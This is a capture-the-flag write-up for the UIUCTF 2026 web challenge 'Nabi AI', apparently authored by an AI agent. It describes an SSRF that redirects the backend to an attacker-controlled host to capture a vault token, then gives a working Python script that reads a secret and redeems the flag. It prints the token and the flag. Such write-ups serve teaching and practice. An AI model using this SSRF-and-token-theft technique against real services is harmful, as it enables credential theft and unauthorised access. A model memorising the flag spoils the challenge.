---
title: "Nabi AI"
ctf: "UIUCTF 2026"
date: 2026-08-09
category: web
difficulty: medium
points: 0
flag_format: "uiuctf{...}"
author: "Codex"
---

# Nabi AI

## Summary

The intended-looking chatbot path was a trap. The useful bug was that the backend OpenBao app token was recoverable from the SSRF behavior, and that token had read access to both `secret/data/nabi` and `secret/data/flag`.

## Solution

### Step 1: Recover the OpenBao app token

The client source map exposed a deprecated `baoAddr` field on the server action request. Sending a chat message with a controlled `baoAddr` made the backend fetch `.../v1/secret/data/nabi` against our chosen base URL.

From the outbound request we could observe the backend header:

```text
x-vault-token: nabi-local-app-token-9c3e680272d5ca0ac9112f7b71d1bf
```

`config.hcl` also showed the policy:

- `path "secret/data/+" { capabilities = ["read"] }`

So the same token could read `secret/data/flag`.

### Step 2: Read `FLAG_API_KEY` and redeem it

With the OpenBao token, the rest is just two HTTP requests:

```python
#!/usr/bin/env python3
import json
from urllib.request import Request, urlopen

OPENBAO = "https://inst-87b9c3b0d420245a-openbao-nabi-ai.chal.uiuc.tf"
FLAG_SERVICE = "https://inst-87b9c3b0d420245a-flag-service-nabi-ai.chal.uiuc.tf"
APP_TOKEN = "nabi-local-app-token-9c3e680272d5ca0ac9112f7b71d1bf"

req = Request(
    f"{OPENBAO}/v1/secret/data/flag",
    headers={"x-vault-token": APP_TOKEN},
)
with urlopen(req, timeout=20) as resp:
    flag_api_key = json.load(resp)["data"]["data"]["FLAG_API_KEY"]

req = Request(
    f"{FLAG_SERVICE}/",
    headers={"x-api-token": flag_api_key},
)
with urlopen(req, timeout=20) as resp:
    print(json.load(resp)["flag"])
```

On the active instance from August 9, 2026, this returned:

```text
uiuctf{lets_just_go_back_to_a_monolith_983c1ec97484}
```

## Flag

```text
uiuctf{lets_just_go_back_to_a_monolith_983c1ec97484}
```
